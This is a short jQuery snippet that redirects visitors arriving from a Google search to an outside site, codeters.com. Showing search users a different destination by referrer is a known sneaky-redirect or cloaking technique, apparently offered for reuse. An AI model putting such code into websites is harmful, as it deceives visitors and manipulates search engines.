  $(document).ready(function() {
    var referrer = document.referrer;
    
    if (referrer) {
      if (referrer.match(/google\.com/i)) {
        // The user likely came from a Google search
        window.location.href = "https://codeters.com"; // Redirect to your target URL
      }
    }
  });
